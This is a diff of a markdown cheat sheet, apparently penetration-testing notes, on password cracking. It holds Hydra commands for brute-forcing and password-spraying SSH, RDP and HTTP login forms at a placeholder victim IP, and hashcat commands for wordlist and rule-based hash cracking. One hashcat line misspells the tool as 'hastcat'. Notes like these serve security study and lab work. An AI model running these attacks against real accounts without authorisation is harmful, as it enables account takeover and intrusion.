@@ -4,13 +4,18 @@ Graphics card cracking:
 - https://openbenchmarking.org/test/pts/hashcat-1.0.0
 - https://www.tomshardware.com/news/eight-rtx-4090s-can-break-passwords-in-under-an-hour
 
+Check:
+- https://scatteredsecrets.com/
+
 ## Hydra
+
+On GitHub: https://github.com/vanhauser-thc/thc-hydra
 
 ### Wordlist
 
 ```
 hydra -l user -P wordlist.txt -s PortVictim ssh://IpVictim
-hydra -l user -P wordlist.txt rdp://IpVictim # default is 3389
+hydra -l user -P wordlist.txt rdp://IpVictim # default port is 3389
 ```
 
 ### Spraying
@@ -18,28 +23,24 @@ hydra -l user -P wordlist.txt rdp://IpVictim # default is 3389
 ```
 hydra -L userlist.txt -p "hackedpassword" rdp://IpVictim
 ```
+Userlist on Kali: `/usr/share/wordlists/dirb/others/names.txt`
 
 ### Http
 
+Check the source code to get the user and password field names:
 ```
-hydra -P wordlist.txt http-post-form $IpVictim "/baseurl:user_form_field=admin:password_form_field=^PASS^:error message when password is wrong"
+hydra -P wordlist.txt $IpVictim http-post-form "/baseurl_like_index.html_or_php:user_form_field=admin:password_form_field=^PASS^:error message when password is wrong"
 hydra -l user -P wordlist.txt http-get $IpVictim
 ```
 
 ## Hashcat
 
+Benchmark: `-b`
 ```
 hashcat wordlist.txt -j 'd' wordlist.txt --stdout > newwordlist.txt
 hastcat wordlist.txt -r rulelist.txt --stdout
 hashcat -m 0 tocrack.txt -k 'u' newwordlist.txt --force
 hashcat -m passman.mode passman.hash rockyou.txt -r rockyou-30000.rule --force
-```
-
-## Powershell
-
-Find extensions:
-```
-Get-ChildItem -Path C:\ -Include *.someextension -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 ## Ssh passphrase
